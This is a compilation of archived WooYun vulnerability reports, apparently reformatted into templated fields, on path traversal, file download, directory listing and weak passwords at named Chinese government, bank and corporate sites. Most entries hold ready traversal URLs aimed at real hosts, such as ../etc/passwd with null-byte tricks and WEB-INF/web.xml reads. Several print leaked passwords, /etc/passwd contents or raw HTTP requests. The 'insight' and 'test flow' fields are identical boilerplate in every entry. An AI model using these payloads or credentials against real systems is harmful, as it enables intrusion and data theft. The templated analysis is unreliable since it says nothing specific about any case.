**详情**: http://www.dflpj.cn/main/http://www.dflpj.cn/temp/http://www.dfyb.com.cn/inc/http://www.dfackc.net/database.rar数据库

**POC**: 求礼物来了

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-027968] 某市人民政府网站目录遍历漏洞可下载源码
**厂商**: 藁城市人民政府门户网站 | **年份**: 2013 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.列出目录2.网站源码备份3个左右（先下载）3.下载后的源码展览4.ew数据库（作用不大）

**POC**: 这目录就是证明了。

**绕过**: 直接利用

**修复**: 不多说。一个危险但是修复又简单的漏洞。多给几个rank
---

---
### [wooyun-2016-0171318] 新华保险在线客服任意文件下载漏洞
**厂商**: 新华保险 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 参考自WooYun: live800客服系统任意文件下载漏洞中公开的地址，新华保险主站访问http://www.newchinalife.com/live800/downlog.jsp?path=/&fileName=/etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-061389] 中国中小企业赤峰网任意文件读取
**厂商**: 中国中小企业赤峰网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.smecf.gov.cn/editor/Dialog/play.asp?raiz=E:\WWWROOT\SME\Editor

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-017855] 交通银行某服务器多处安全威胁
**厂商**: 交通银行 | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 风险一、iis短文件名图上亮点自己找，附上我猜到其中的一个sql文件下载截图：风险二、源码泄漏没错，就是asp....看源码需要场景配合，不过conn.asp源码无果，猜测是墙捣鬼，求交行管理员指教.风险三、FCKeditor风险一中的一处亮点，版本为 2.6.3风险四、暴力破解不知道admin/admin能不能登录，无验证码，挂上字典跑跑风险应该还是有的:

**POC**: 风险一、iis短文件名图上亮点自己找，附上我猜到其中的一个sql文件下载截图：风险二、源码泄漏没错，就是asp....看源码需要场景配合，不过conn.asp源码无果，猜测是墙捣鬼，求交行管理员指教.风险三、FCKeditor风险一中的一处亮点，版本为 2.6.3风险四、暴力破解不知道admin/admin能不能登录，无验证码，挂上字典跑跑风险应该还是有的:

**绕过**: 直接利用

**修复**: 鉴于以上问题是在粗略浏览情况下发现的，不排除还存在其他重大风险，故加固事宜建议咨询贵行安全工程师或@ wooyun 任意白帽子，我想贵行在看到我账户余额后，应该不好意思免费咨询我:)
---

---
### [wooyun-2013-028095] 贵州某政府网站存在任意文件下载漏洞
**厂商**: 贵州省某政府网站 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 贵州省卫生厅存在存在任意文件下载漏洞http://www.gzwst.gov.cn随便进入一个下载页面，下载时用burp抓包http://www.gzwst.gov.cn/SysHTML/ArticleHTML/12738_1.shtml修改文件名即可以任意下载文件并且还为root权限，可以下载shadow文件

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 进行权限设置，以及下载目录设置
---

---
### [wooyun-2015-0141241] 陕西省宝鸡市政府网站任意文件下载
**厂商**: 陕西省宝鸡市政府 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 大牛审过，没过好多次，想拿个账号这么难下载系统上的文件/etc/shadow和其他系统上档案：http://**.**.**.**/download?fileName=..%2f..%2f..%2f..%2fetc%2fpasswd

**POC**: 下载系统上的文件/etc/shadow和其他系统上档案：http://**.**.**.**/download?fileName=..%2f..%2f..%2f..%2fetc%2fpasswd

**绕过**: 直接利用

**修复**: 大牛比我懂
---

---
### [wooyun-2015-0104065] TCCMSV9.0 最新版本地文件包含
**厂商**: teamcen.com | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 参数注入

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: public function Run() {$this->Analysis();$this->control = $_GET['c'];$this->action = $_GET['a'];if ($_GET['a'] === "list") {$this->action = "listAll";}//子目录支持$dir = '';if (isset($_GET['d'])) {$dir .= $_GET['d'].'/';}$adminDir = '/controller/';if (defined('IN_ADMIN')) {$adminDir = '/admin/';}//子模块支持$module = strcmp(MODULE, "/") == 0 ? 'app' : MODULE;$controlFile = ROOT_PATH . '/' . $module . $admin

**POC**: 在网站根目录下添加一个测试的txt文件:POC:http://192.168.152.160/tccms/index.php?d=../../1.txt%00

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0161629] 国药多站漏洞(弱口令+目录遍历)
**厂商**: 国药集团 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标1：http://www.sinopharm-sd.com/存在fck，但是无法利用发现弱口令一枚后台：http://www.sinopharm-sd.com/admin/admin_login.aspx用户名/密码：admin/admin上传的地方貌似都禁止掉了目标2：http://www.gykgah.cn/目录遍历http://www.gykgah.cn/aspnet_client/system_web/http://www.gykgah.cn/aspnet_client/http://www.gykgah.cn/data/http://www.gykgah.cn/images/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 贵集团旗下很多网站,oa系统都是弱口令
---

---
### [wooyun-2016-0170387] 信雅达某系统存在2处任意文件下载漏洞
**厂商**: sunyard.com | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://120.199.7.135/services.jsp这2个红圈处存在任意文件下载http://120.199.7.135/downloadContract.action?inputPath=%2FWEB-INF%2Fweb.xml

**POC**: http://120.199.7.135/downloadProtocol.action?inputPath=%2FWEB-INF%2Fweb.xml

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2012-07004] 优酷某处目录遍历
**厂商**: 优酷 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 手机优酷文件下载目录遍历：http://w.go.youku.com/widget/

**POC**: phpinfo()：http://w.go.youku.com/widget/nokia/n97/api/test.php

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-087369] 重庆文理学院机房环境监控系统弱口令网站文件目录权限管控不严格
**厂商**: 重庆文理学院 | **年份**: 2014 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天在无聊扫网段的时候扫到的这个，于是乎就开始研究，先是发现这个管理系统网站目录权限管控不严格，可以下载网站目录的任意文件，然后就开始猜这个系统的管理员密码！神马123456,神马567890都试了还是不对，暂时放弃了猜解~然后就无聊的分析那个rc.local文件，就在无聊透顶的时候去试试了一个密码~~尼玛呀( ⊙ o ⊙ )！居然是6个1这个密码！！！不管那个等进去玩一玩，其实这个监控管理控制台被非法控制的话影响还是比较大的，里面涉及到了机房监控报警和烟感的控制，最厉害的是机房门禁的控制，通过这个控制台可以打开机房的大门，想进就进想出就出~~~~不！安！全！PS:(这个监控系统ftp也是匿名访问不用建议取消)http://222.179.99.154/

**POC**: 机房的布局各种温度状态各种看，还可以取消报警想进机房大门的找我~我给你们开门哈你只有5秒钟的进门时间！进去就别想出来！！机房内所有设备的信息网站根目录权限管控不严

**绕过**: 直接利用

**修复**: 1、类似这种监控系统可以限制外网访问2、严禁使用弱口令3、加强目录权限的管控4、完了~~~
---

---
### [wooyun-2015-0145826] 钢之家任意文件读取
**厂商**: 钢之家 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: code地址：http://mail2011.steelhome.cn/login.php?Lang=../../../../../../../../../../etc/passwd%00.jpg

**POC**: root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:

**绕过**: 直接利用

**修复**: 加强过滤啊
---

---
### [wooyun-2014-065973] 多个政府网站任意文件下载漏洞
**厂商**: cncert | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: google 搜索了一批政府网站，发现大部分都有任意文件下载漏洞，批量提交，希望不走小厂商。www.sxazj.gov.cn/download.jsp?path=../WEB-INF/web.xmlwww.nqs.gov.cn/cms/web/download.jsp?FileUrl=web/download.jsphttp://www.heyuan.gov.cn/do_download.jsp?path=/do_download.jsprd.heyuan.gov.cn/do_download.jsp?path=/do_download.jsphttp://www.lntour.gov.cn/load.jsp?path=../WEB-INF&file=web.xmlhttp://www.zscj.gov.cn/DownFile/OpenFile.aspx?XFileName=../web.

**POC**: www.sxazj.gov.cn/download.jsp?path=../WEB-INF/web.xmlwww.nqs.gov.cn/cms/web/download.jsp?FileUrl=web/download.jsphttp://www.heyuan.gov.cn/do_download.jsp?path=/do_download.jsprd.heyuan.gov.cn/do_download.jsp?path=/do_download.jsphttp://www.lntour.gov.cn/load.jsp?path=../WEB-INF&file=web.xmlhttp://ww

**绕过**: 直接利用

**修复**: 批量处置吧。。。过滤什么的
---

---
### [wooyun-2014-088919] 迅雷某MySQL Server可远程登录(root)
**厂商**: 迅雷 | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Host: 121.10.120.242User: rootPass: sd-9******

**POC**: mysql> show databases;+---------------------------+| Database                  |+---------------------------+| BugReport                 || DLDailyDefault            || DLDailyTel                || GlobalConfig              || NormalDistributeDefault   || NormalDistributeTel       || PCCanDownloadCh

**绕过**: 直接利用

**修复**: 建议： 修改密码，通过白名单限定可远程登录的IP
---

---
### [wooyun-2011-03475] 迅雷网邻任意文件下载漏洞
**厂商**: 迅雷 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过修改协议数据，可伪造下载的文件数据如<?xml version="1.0" encoding="utf-8"?><XLNeighbour_Data><folder type="0"><folders size="0"/><files size="1"><file path="桌面/../../../../../../Windows/repair/sam"/></files></folder></XLNeighbour_Data>。客户端输入时虽然做了验证，但是在作为服务端提供共享文件时未验证或验证不严。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 增加验证，不在共享的文件或文件夹不允许提供下载
---

---
### [wooyun-2016-0193026] 中国证监会某站存在任意文件下载漏洞（可读shadow密码）
**厂商**: 中国证监会 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/中国证监会非上市公众公司信息披露系统

**POC**: **.**.**.**/nlpcxbrl/download.action?inputPath=/&fileName=etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0129655] 东莞政协提案管理系统任意文件下载
**厂商**: 广东省信息安全测评中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://zxta.dg.gov.cn/dgzx/Common/DownloadFile?path=fileName

**POC**: 可下载web.config 等敏感文件

**绕过**: 直接利用

**修复**: 对path参数过滤，至今还没有乌云账号，只求一个邀请码
---

---
### [wooyun-2014-054128] 贵州非公经济网任意文件下载
**厂商**: 贵州非公经济网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.smegz.gov.cn/ctiin/share/DownloadFileAction.do?file=index.jsp&name=22.txt

**POC**: www.smegz.gov.cn/ctiin/share/DownloadFileAction.do?file=index.jsp&name=22.txt

**绕过**: 直接利用

**修复**: 过滤？
---

---
### [wooyun-2011-02023] 交通银行E贷通网站目录遍历漏洞
**厂商**: 交通银行 | **年份**: 2011 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞提供者：gyregmail:webvul@sohu.com

**POC**: http://rsas.bankcomm.com:9080/

**绕过**: 直接利用

**修复**: 修改httpd.conf配置文件，Options FollowSymLinks ExecCGI Indexes  //大概在252行左右删除Indexes，保存配置文件，重新启动服务即可。
---

---
### [wooyun-2015-0133055] 点到为止之爱丽第二弹【各种敏感信息泄露&附送多个配置不当】
**厂商**: aili.com | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 后台管理

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上一弹是办公（bangong-aili）存在备份下载。你可能以为删除了www压缩包就会没有风险了。后来又继续看站发现站存在目录遍历。各种include/config文件又是一览无余。。0x01:点到为止，其余自己排除http://bangong.aili.com/includes/http://bangong.aili.com/config/<?php/*生产环境*///	$config['dbhost'] = '192.168.211.2';      //数据库所在IP地址//	$config['dbuser'] = 'seabuy_user';  //数据库用户//	$config['dbpass'] = '4OOh4DTx1I';   	 //数据库密码//	$config['dbname'] = 'seabuy';     //数据库名/*测试服*/// $config['dbh

**POC**: 以下为赠送漏洞！！赠送给厂商的！0x02:附送各类配置不当特价整站程序可被Downloadhttp://tejia.aili.com/.svn/entries0x03:跨域：http://product.aili.com/crossdomain.xml http://hzp.aili.com/crossdomain.xml http://images.aili.com/crossdomain.xml0x04:http://images.aili.com/aili_logo/.DS_Storehttp://images.aili.com/.DS_Storehttp://images.aili.c

**绕过**: 直接利用

**修复**: 爱丽姐，看我送这么多份上。。IPS走哪了？
---

---
### [wooyun-2014-048887] 上海国宾医疗中心私密体检报告可被随意下载
**厂商**: 上海国宾医疗中心 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件下载路径名为：http://www.guobin.net/xxx/xxxxx.pdf但是 http://www.guobin.net/xxx/ 可以目录访问，会列出所有报告。好多私密数据今年开始体检单位实行体检报告网上下载。注册完之后登录即可下载。访问：http://www.guobin.net/UpFiles/pdf/好多好多pdf。

**POC**: 访问：http://www.guobin.net/UpFiles/pdf/

**绕过**: 直接利用

**修复**: IIS 修改目录访问权限
---

---
### [wooyun-2013-020861] 【盛大180天渗透纪实】第四章.SVN猎手 （某站SVN信息泄露+设计问题导致服务器沦陷）
**厂商**: 盛大在线 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 本想着81端口服务器能对下一步渗透有所帮助。。 结果发现这个段上站点并不多。。 整个段上貌似只有这一个站和一个数据库服务器是活的 = =so，再次改变思路。。用某二级域名查询工具导出了一份盛大的站点，进行普扫。。。其中发现了bbsdk.sdo.com的一处源码备份不过看了一会儿 貌似又是一个已下线的站。。半小时以后，扫描结果出来。即使一些站有比较敏感的目录，也被盛大的UAM挡在了外面。。。不过，发现在58.215.44.53里发现了svn泄露信息数据库信息不过依然禁止外连。。。。。。通过查看，发现了此站的后台。但是获取不了管理员密码，也登不进去。。。不过难得来一次SVN，还是仔细分析了下。。。找到了一个注册页面？？？随便注册了个用户，登录后台。。但却提示“无效的用户”，对应的目录下很多功能都无法访问。。。。。。转到其它目录，也是如此突然，这个upload目录吸引了眼球。。通过SVN查看了一

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 对于bbsdk.sdo.com·及时下线过期业务·修改本例中涉及的MSSQL密码对于wj.sdo.com如果该站点被不法分子渗透，并将手机应用程序替换成木马病毒，将会给大量手机用户造成危害！！！·删除SVN信息·修改本例中涉及的MYSQL密码·检查并删除可能存有的PHP木马
---

---
### [wooyun-2014-081265] 某公司手机游戏网站任意下载漏洞
**厂商**: 就爱乐 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://hzw.92le.com/reread/wml.do?fn=../../../../../../../../../../etc/passwd%00.jpg&pn=$gopn&ps=15http://hzw.92le.com/reread/w.do?f=GEHT&fn=../../../../../../../../../../etc/passwd%00.jpg&pt=ct

**POC**: http://hzw.92le.com/reread/wml.do?fn=../../../../../../../../../../etc/passwd%00.jpg&pn=$gopn&ps=15http://hzw.92le.com/reread/w.do?f=GEHT&fn=../../../../../../../../../../etc/passwd%00.jpg&pt=ct读取了一个账号密码解密后如下账号haochengfang 密码q1w2e3r4

**绕过**: 直接利用

**修复**: 你们懂的！
---

---
### [wooyun-2016-0189704] 中兴某网关设备通用型2处任意文件下载漏洞(无需登录)
**厂商**: 中兴通讯股份有限公司 | **年份**: 2016 | **类型**: 非授权访问/认证绕过

**元思考**: 触发信号: 功能测试

**洞察**: 非授权访问/认证绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别非授权访问/认证绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 混乌云之pwnsh4d0w（与freebuf不同)设备型号为：ZTE Management system可通过傻蛋搜索第一处：php特性（1024截断)包含导致文件下载GET /index.php HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: PHPSESSID=33ab68c9ea9

**POC**: 混乌云之pwnsh4d0w（与freebuf不同)设备型号为：ZTE Management system可通过傻蛋搜索第一处：php特性（1024截断)包含导致文件下载GET /index.php HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Lang

**绕过**: 截断攻击

**修复**: 加强输入验证
---

---
### [wooyun-2012-06895] 内蒙古号码百事通任意文件下载漏洞
**厂商**: 内蒙古号码百事通 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这个你们懂的~~~
---

---
### [wooyun-2015-0103857] 惠尔顿上网行为管理系统任意文件下载及信息泄露八处（无需登录）
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 惠尔顿上网行为管理系统任意文件下载及信息泄露八处（无需登录）官网经典案例：http://www.wholeton.com/Anli.php外网部分实际案例：1.https://test.bescar.com2.https://angelic.com.cn/3.http://222.223.56.1164.https://222.92.15.1005.http://111.206.133.4/6.http://mail.hualiu.cc/先来看看五处任意文件下载吧首先简单过滤一下base目录下可能存在漏洞的文件：find -name '*.php' | xargs grep  -l 'Content-Disposition'然后手工打开文件依次看看是否存在漏洞最后剩下这五处存在漏洞：1、http://222.223.56.116/base/web/downAnnex.php?filenam

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 没有比重写更好的建议
---

---
### [wooyun-2015-0126987] 某学校建站系统任意文件下载漏洞
**厂商**: CNVD | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看到挺多人用的所以就提交上来了;找到约 196,000 条结果问题出在file参数没有对下载文件进行严格验证：/Tools/stream/FlvStream.ashx?file=./web.config应该还有新的玩法吧？不仅仅下载配置文件。案例比较多：http://**.**.**.**/Tools/stream/FlvStream.ashx?file=./web.confighttp://**.**.**.**/Tools/stream/FlvStream.ashx?file=./web.confighttp://**.**.**.**/Tools/stream/FlvStream.ashx?file=./web.confighttp://**.**.**.**/Tools/stream/FlvStream.ashx?file=./web.confighttp://**.**.**.*

**POC**: 下载看了几个，都是sa权限，不清楚内外网链接，反正这个密码可能可以试试后台的http://**.**.**.**/Tools/stream/FlvStream.ashx?file=./web.config

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-012519] 中国银行河南省分行（疑似钓鱼）重要信息泄漏导致信息泄漏
**厂商**: 中国银行河南省分行 | **年份**: 2012 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 认证接口

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 大量目录遍历  /../admin  跨过管理登陆页面进入

**POC**: 网址：http://www.hnboczxqy.com漏洞页面：http://www.hnboczxqy.com/Images/  目录浏览http://www.hnboczxqy.com/Js/  目录浏览http://www.hnboczxqy.com/admin/FCKeditor/  目录浏览http://www.hnboczxqy.com/admin/  直接跨后台登陆页面进入管理页面就爆这么多吧 下面什么情况大家想的到

**绕过**: 直接利用

**修复**: 目录权限设置后台源码重新编辑吧服务器漏洞补丁打上吧
---

---
### [wooyun-2015-0127956] 惠普两处任意文件下载
**厂商**: 惠普 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://licensing.hp.com/slm/orangePortal/downloadFile?filename=WEB-INF/web.xmlhttp://licensing.hp.com/slm/orangePortal/downloadFile?filename=index.jsphttp://webware.hp.com/slm/orangePortal/downloadFile?filename=WEB-INF/web.xmlhttp://webware.hp.com/slm/orangePortal/downloadFile?filename=index.jsp

**POC**: 源代码从读取的web.xml中存在<!--+++++++++++++++--><!-- Admin Portal --><!--+++++++++++++++--><servlet><description>Admin Page</description><display-name>admin.welcome.display</display-name><servlet-name>admin.welcome.display</servlet-name><jsp-file>/jsp/admin/admin.jsp</jsp-file></servlet><servlet><description

**绕过**: 直接利用

**修复**: I don't know.
---

---
### [wooyun-2015-090963] 站长之家用户中心系统任意文件读取
**厂商**: 站长之家 | **年份**: 2015 | **类型**: 服务弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 服务弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别服务弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: [root@boom test]#host my.chinaz.commy.chinaz.com has address 117.25.139.77mysql 弱口令/usr/local/mysql/bin/mysql -h 117.25.139.77 -u root -p root

**POC**: 读取系统文件

**绕过**: 直接利用

**修复**: 访问控制
---

---
### [wooyun-2014-077039] 商务中国代码过滤不严格导致jsp文件下载
**厂商**: 商务中国 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://bizcn.com/newticket?module=showimage&fileNmae=/home.jsp

**POC**: <%@ page import="java.lang.*" %><%@ page import="away.servlets.*" %><%!String theme;String title;%><%theme = BaseServlet.getTheme(request, response);title = "域名注册,虚拟主机,企业邮局,服务器租用,服务器托管,主机 控制面板,域名 控制面板";%><%@ include file="header.jsp"%><%@ include file="main_page.jsp"%><%@ include file="footer.jsp"%>

**绕过**: 直接利用

**修复**: 代码中对查看的文件目录或后缀做过滤。
---

---
### [wooyun-2015-0162141] 高朋网某站存在任意文件下载漏洞
**厂商**: 高朋 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://w.gaopeng.com/.svn/entrieshttp://mtest.gaopeng.com/.svn/entries两处存在SVN可导致文件被下载。。

**POC**: http://w.gaopeng.com/.svn/entrieshttp://mtest.gaopeng.com/.svn/entries两处存在SVN可导致文件被下载。。

**绕过**: 直接利用

**修复**: ///
---

---
### [wooyun-2012-07770] 手机土豆网存在JAVA版LFI漏洞
**厂商**: 土豆网 | **年份**: 2012 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞出现在http://m.tudou.com/search.do里。。。看漏洞证明吧。

**POC**: http://m.tudou.com/search.do?kw=%3C%3E&v=3/../../web.xml?&sid=aea2cd8c86734fcc997344b06a9a7059&cp=&x=20&y=12http://m.tudou.com/search.do?kw=%3C%3E&v=3/../../classes/struts.properties?&sid=aea2cd8c86734fcc997344b06a9a7059&cp=&x=20&y=12

**绕过**: 直接利用

**修复**: 过滤哈···
---

---
### [wooyun-2015-0114922] 52PK游戏网某站点目录遍历
**厂商**: 52PK游戏网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://top.52pk.com/index.php?c=../../../../../../../../../../proc/self/environ%00.txt&color_1=&line=10&m=add&p=xin_ts&title=e&width=260当前用户uid是0，root:http://top.52pk.com/index.php?c=../../../../../../../../../../proc/self/loginuid%00.txt&color_1=&line=10&m=add&p=xin_ts&title=e&width=260

**POC**: http://top.52pk.com/index.php?c=../../../../../../../../../../proc/self/cmdline%00.txt&color_1=&line=10&m=add&p=xin_ts&title=e&width=260读出配置文件的路径：/usr/local/php/etc/php-fpm.conf但是发现读取该文件出错，多半是权限的原因，因为尝试读取shadow也失败了。

**绕过**: 直接利用

**修复**: 参数过滤
---

---
